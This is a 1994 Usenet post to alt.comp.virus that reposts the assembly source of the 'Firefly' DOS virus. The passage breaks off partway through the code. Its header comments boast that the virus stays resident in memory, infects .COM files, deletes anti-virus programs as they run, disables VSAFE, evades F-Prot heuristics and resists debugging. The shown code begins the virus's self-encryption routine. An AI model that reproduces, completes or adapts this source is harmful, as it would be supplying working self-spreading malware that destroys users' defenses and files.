From netcom.com!ix.netcom.com!howland.reston.ans.net!cs.utexas.edu!geraldo.cc.utexas.edu!axpvms.cc.utexas.edu!HALFLIFE Tue Nov 29 09:56:01 1994
Xref: netcom.com alt.comp.virus:491
Path: netcom.com!ix.netcom.com!howland.reston.ans.net!cs.utexas.edu!geraldo.cc.utexas.edu!axpvms.cc.utexas.edu!HALFLIFE
From: halflife@axpvms.cc.utexas.edu
Newsgroups: alt.comp.virus
Subject: Firefly virus
Date: 28 Nov 1994 08:51:37 GMT
Organization: University of Texas @ Austin
Lines: 61
Message-ID: <3bc5mq$p63@geraldo.cc.utexas.edu>
Reply-To: halflife@axpvms.cc.utexas.edu
NNTP-Posting-Host: axpvms.cc.utexas.edu

;FIREFLY virus, by Nikademus.                
;
;Firefly is an encrypted, memory resident virus which infects
;.COMfiles on load.  It incorporates code from Proto-T, 
;LokJaw and YB-X viruses and, when in memory, attacks a large selection
;of anti-virus programs as they are executed.  Anti-virus programs
;identified by Firefly's execute/load handler are deleted.
;Firefly incorporates simple code from previous issues of the newsletter
;designed to de-install generic VSAFE resident virus activity
;filters designed for Microsoft by Central Point Software.  It
;contains instructions - specifically a segment of pseudo-nested 
;loops - which spoof F-Protect's expert system generic virus
;identification feature.
;
;FIREFLY also includes a visual marker tied to the system timer
;tick interrupt (1Ch) which slowly cycles the NumLock, CapsLock
;and ScrollLock LEDs on the keyboard.  This produces a noticeable
;twinkling effect when the virus is active on a machine.
;
;Anti-anti-virus measures used by Firefly vary in effectiveness
;dependent upon how a user employs software.  For example, while
;Firefly is designed to delete the Victor Charlie anti-virus
;shell, VC.EXE, a user who employs the software packages utilities
;for generic virus detection singly, will not be interfered with
;by the virus. Your results may vary, but the virus does effectively
;delete anti-virus programs while in memory unless steps are taken
;beforehand to avoid this.
;
;Firefly incorporates minor code armoring techniques designed to thwart
;trivial debugging.
 
                
                
                .radix 16
     code       segment
                model  small
                assume cs:code, ds:code, es:code
 
                org 100h
 
len             equ offset last - start
vir_len         equ len / 16d                    ; 16 bytes per paragraph 
encryptlength   equ (last - begin)/4+1
 
 
 
start:
                mov bx, offset begin        ; The Encryption Head
                mov cx, encryptlength       ;
encryption_loop:                            ;
                db      81h                 ; XOR WORD PTR [BX], ????h
                db      37h                 ;
encryption_value_1:                         ;
                dw      0000h               ;
                                            ;
                db      81h                 ; XOR WORD PTR [BX+2], ????h
                db      77h                 ;
                db      02h                 ; 2 different random words
encryption_value_2:                         ; give 32-bit encryption
                dw      0000h               ;
                add     bx, 4               ;

